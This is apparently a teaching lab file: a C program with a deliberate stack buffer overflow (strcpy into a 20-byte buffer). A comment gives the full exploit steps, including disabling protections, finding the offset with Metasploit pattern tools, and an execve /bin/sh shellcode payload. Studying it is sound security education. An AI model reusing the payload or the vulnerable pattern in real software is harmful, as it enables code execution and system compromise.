/* 
POC of stack-buffer-overflow

gcc vulnerable.c -o vulnerable -fno-stack-protector 
execstack -s ./vulnerable
echo 0 > /proc/sys/kernel/randomize_va_space
edb --run ./vulnerable $(python -c 'print "A"*200')
/usr/share/metasploit-framework/tools/pattern_create.rb 200

edb --run ./vulnerable Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

/usr/share/metasploit-framework/tools/pattern_offset.rb 31624130 #get offset 32

edb --run ./vulnerable $(python -c 'print "A"*32 + "B"*4 + "C"*164')

use Linux/x86 execve /bin/sh shellcode 23 bytes http://shell-storm.org/shellcode/files/shellcode-827.php
edb --run ./vulnerable $(python -c 'print "A"*32 + "\x90\xf1\xff\xbf" +"\x90"*141 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')

*/

#include <stdio.h>
#include <string.h>

int main(int argc, char** argv)
{
 char buffer[20];
 strcpy(buffer, argv[1]);
 printf("%s\n",buffer);
 return 0;
}
